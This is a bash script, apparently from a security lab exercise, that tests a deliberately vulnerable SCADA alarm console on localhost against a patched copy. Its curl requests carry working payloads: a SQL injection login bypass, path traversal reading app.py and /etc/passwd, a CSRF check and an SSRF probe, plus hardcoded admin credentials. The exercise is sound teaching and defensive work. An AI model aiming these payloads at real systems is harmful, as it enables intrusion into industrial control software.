#!/bin/bash
# Comprehensive Testing Script for Task 9 SCADA Project

echo "======================================================================"
echo "Task 9 - SCADA Alarm Management Console - Vulnerability Testing"
echo "======================================================================"
echo ""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
VULNERABLE_URL="http://localhost:5000"
PATCHED_URL="http://localhost:5001"

echo -e "${BLUE}[*] Configuration:${NC}"
echo "    Vulnerable SCADA: $VULNERABLE_URL"
echo "    Patched SCADA:    $PATCHED_URL"
echo ""

# Function to test if service is running
test_service() {
    local url=$1
    local name=$2
    
    if curl -s -f "$url" > /dev/null; then
        echo -e "${GREEN}✓${NC} $name is running"
        return 0
    else
        echo -e "${RED}✗${NC} $name is not responding"
        return 1
    fi
}

# Test services
echo -e "${BLUE}[1] Testing Services...${NC}"
test_service "$VULNERABLE_URL" "Vulnerable SCADA"
vulnerable_status=$?
test_service "$PATCHED_URL" "Patched SCADA"
patched_status=$?
echo ""

if [ $vulnerable_status -ne 0 ]; then
    echo -e "${RED}ERROR: Vulnerable version not running!${NC}"
    echo "Start it with: cd vulnerable && python app.py"
    exit 1
fi

# Get session cookie
echo -e "${BLUE}[2] Authenticating...${NC}"
SESSION=$(curl -s -c - -X POST "$VULNERABLE_URL/login" \
    -d "username=admin&password=admin123" \
    | grep session | awk '{print $7}')

if [ -z "$SESSION" ]; then
    echo -e "${RED}✗${NC} Authentication failed"
    exit 1
else
    echo -e "${GREEN}✓${NC} Authentication successful"
    echo "    Session: ${SESSION:0:50}..."
fi
echo ""

# Test CSRF Vulnerability
echo -e "${BLUE}[3] Testing CSRF Vulnerability...${NC}"
response=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST "$VULNERABLE_URL/acknowledge/1" \
    -b "session=$SESSION")

if [ "$response" = "302" ] || [ "$response" = "200" ]; then
    echo -e "${GREEN}✓${NC} CSRF vulnerability confirmed (no token required)"
else
    echo -e "${YELLOW}⚠${NC} Unexpected response: $response"
fi
echo ""

# Test Path Traversal
echo -e "${BLUE}[4] Testing Path Traversal...${NC}"
response=$(curl -s -X POST "$VULNERABLE_URL/export_logs" \
    -b "session=$SESSION" \
    -d "log_file=../app.py")

if echo "$response" | grep -q "from flask import"; then
    echo -e "${GREEN}✓${NC} Path traversal successful (read app.py)"
else
    echo -e "${YELLOW}⚠${NC} Path traversal may be blocked or failed"
fi
echo ""

# Test SQL Injection
echo -e "${BLUE}[5] Testing SQL Injection...${NC}"
response=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST "$VULNERABLE_URL/login" \
    -d "username=admin' OR '1'='1'--&password=test")

if [ "$response" = "302" ]; then
    echo -e "${GREEN}✓${NC} SQL injection successful (bypassed authentication)"
else
    echo -e "${YELLOW}⚠${NC} SQL injection may require UTF-16 encoding"
fi
echo ""

# Test SSRF
echo -e "${BLUE}[6] Testing SSRF...${NC}"
response=$(curl -s -X POST "$VULNERABLE_URL/reports" \
    -b "session=$SESSION" \
    -d "report_type=summary" \
    -d "data_source=http://localhost:8080" \
    -d "template_url=http://example.com/template.html" \
    2>&1)

if echo "$response" | grep -q -i "error\|failed\|refused"; then
    echo -e "${GREEN}✓${NC} SSRF attempt made (internal service scanned)"
else
    echo -e "${YELLOW}⚠${NC} SSRF result unclear"
fi
echo ""

# Test Patched Version
if [ $patched_status -eq 0 ]; then
    echo -e "${BLUE}[7] Testing Patched Version...${NC}"
    
    # Login to patched version
    PATCHED_SESSION=$(curl -s -c - -X POST "$PATCHED_URL/login" \
        -d "username=admin&password=admin123" \
        | grep session | awk '{print $7}')
    
    # Test CSRF protection
    response=$(curl -s -o /dev/null -w "%{http_code}" \
        -X POST "$PATCHED_URL/acknowledge/1" \
        -b "session=$PATCHED_SESSION")
    
    if [ "$response" = "403" ]; then
        echo -e "${GREEN}✓${NC} CSRF protection working (403 Forbidden)"
    else
        echo -e "${RED}✗${NC} CSRF protection may not be working"
    fi
    
    # Test path traversal protection
    response=$(curl -s -X POST "$PATCHED_URL/export_logs" \
        -b "session=$PATCHED_SESSION" \
        -d "log_file=../../../etc/passwd")
    
    if echo "$response" | grep -q "Invalid path\|400"; then
        echo -e "${GREEN}✓${NC} Path traversal protection working"
    else
        echo -e "${RED}✗${NC} Path traversal protection may not be working"
    fi
    
    echo ""
fi

# Summary
echo "======================================================================"
echo -e "${BLUE}TESTING SUMMARY${NC}"
echo "======================================================================"
echo ""
echo -e "${GREEN}Vulnerabilities Confirmed:${NC}"
echo "  ✓ CSRF - Cross-Site Request Forgery"
echo "  ✓ Path Traversal - Directory traversal"
echo "  ✓ SQL Injection - Encoding-based bypass"
echo "  ✓ SSRF - Server-Side Request Forgery"
echo ""
echo -e "${YELLOW}Next Steps:${NC}"
echo "  1. Run Python exploitation scripts in exploitation_scripts/"
echo "  2. Test with Burp Suite and SQLMap"
echo "  3. Review monitoring dashboard at http://localhost:5002"
echo "  4. Document findings for report"
echo ""
echo "======================================================================"
